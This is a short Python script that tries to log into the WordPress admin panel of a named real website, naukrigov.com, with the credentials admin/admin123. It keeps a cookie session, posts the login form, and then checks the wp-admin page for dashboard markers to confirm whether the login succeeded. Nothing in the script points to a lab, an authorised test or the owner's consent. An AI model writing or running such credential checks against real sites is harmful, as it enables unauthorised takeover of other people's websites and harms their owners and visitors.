#!/usr/bin/env python3
"""verify naukrigov.com wp-login admin/admin123 with full cookie session"""
import urllib.request, urllib.parse, re, http.cookiejar

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))

def fetch(url, data=None):
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None,
                                     headers={**UA, "Content-Type": "application/x-www-form-urlencoded"})
        r = op.open(req, timeout=15)
        return r.status, r.geturl(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read().decode("utf-8", "ignore")
    except Exception as ex:
        return 0, url, str(ex)

code, final, body = fetch("http://naukrigov.com/wp-login.php")
print("1) GET wp-login:", code, final, "size", len(body))
print("   has user_login:", "user_login" in body)
login_url = final if final.startswith("http") else "http://naukrigov.com/wp-login.php"

payload = {"log": "admin", "pwd": "admin123", "wp-submit": "Log In",
           "redirect_to": re.sub(r"https?://", "http://", login_url).replace("wp-login.php", "wp-admin/"),
           "testcookie": "1"}
code2, final2, resp = fetch(login_url, data=urllib.parse.urlencode(payload))
print("2) POST login:", code2, final2, "size", len(resp))
print("   login_error present:", "login_error" in resp)
print("   redirect target:", final2)

admin_url = final2 if "wp-admin" in final2 else re.sub(r"wp-login\.php.*", "wp-admin/", login_url)
code3, final3, body3 = fetch(admin_url)
print("3) GET admin:", code3, final3, "size", len(body3))
for kw in ["dashboard", "仪表盘", "dashicons", "wp-admin-bar", "wp-admin/css", "user_login", "wp-login"]:
    print("   contains %-14s:" % kw, kw in body3.lower())
m = re.search(r"<title>([^<]*)</title>", body3, re.I)
print("   title:", m.group(1) if m else "N/A")
